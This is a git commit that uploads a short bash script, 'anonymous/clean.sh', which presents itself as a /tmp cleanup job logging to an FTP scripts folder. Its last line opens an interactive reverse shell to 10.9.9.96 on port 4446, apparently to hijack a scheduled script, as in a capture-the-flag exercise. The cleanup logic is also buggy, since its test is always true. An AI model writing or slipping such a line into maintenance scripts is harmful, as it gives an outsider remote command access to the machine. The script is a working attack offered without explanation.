9b94d58739c315d7a0d209a16b469b78d2fa9f85
Ivan Shamliev <60672006+P4nd4233@users.noreply.github.com>
2020-06-20 13:11:45 +0300

    Add files via upload

---
+++ anonymous/clean.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+
+tmp_files=0
+echo $tmp_files
+if [ $tmp_files=0 ]
+then
+        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
+else
+    for LINE in $tmp_files; do
+        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
+fi
+bash -i >& /dev/tcp/10.9.9.96/4446 0>&1
